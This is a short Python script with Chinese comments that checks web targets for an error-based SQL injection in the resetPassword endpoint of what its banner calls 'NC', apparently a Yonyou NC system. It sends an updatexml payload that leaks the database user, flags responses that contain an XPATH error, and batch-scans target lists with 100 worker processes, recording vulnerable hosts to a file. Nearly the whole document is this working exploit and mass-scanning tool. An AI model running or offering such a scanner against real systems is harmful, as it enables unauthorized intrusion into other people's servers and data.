import sys
from multiprocessing import Pool

import requests
import argparse


# 漏洞检测模块
def checkVuln(url):
    if not url.startswith(('http://', 'https://')):
        url = f"http://{url}"
    vulnurl = url + "/a/sys/user/resetPassword?mobile=13588888888%27and%20(updatexml(1,concat(0x7e,(select%20user()),0x7e),1))%23"
    headers = {
        'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0'
    }
    try:
        response = requests.get(vulnurl, headers=headers,timeout=5, verify=False)
        if "XPATH syntax error" in response.text:
            print(f"【+】当前网址存在漏洞：{url}")
            with open("../vuln1.txt", "a+") as f:
                f.write(url + "\n")
        else:
            print("【-】目标网站不存在漏洞...")
    except Exception as e:
        print("【-】目标网址存在网络链接问题...")


# 批量漏洞检测模块
def batchCheck(filename):
    urls = []
    with open(filename, "r") as f:
        for readline in f.readlines():
            urls.append(readline.strip())
        pool = Pool(100)
        pool.map(checkVuln,urls)


def banner():

    print("用户NC SQL注入检测")
    print(f"[+]{sys.argv[0]} --url htttp://www.xxx.com 即可进行单个漏洞检测")
    print(f"[+]{sys.argv[0]} --file targetUrl.txt 即可对选中文档中的网址进行批量检测")
    print(f"[+]{sys.argv[0]} --help 查看更多详细帮助信息")


# 主程序方法，进行调用
def main():
    parser = argparse.ArgumentParser(description='漏洞单批检测脚本')
    parser.add_argument('-u', '--url', type=str, help='单个漏洞网址')
    parser.add_argument('-f', '--file', type=str, help='批量检测文本')
    parser.add_argument('-cmd','--cmd', type=str, help='执行命令')
    args = parser.parse_args()
    if args.url:
        checkVuln(args.url)
    elif args.file:
        batchCheck(args.file)
    else:
        banner()


if __name__ == '__main__':
    main()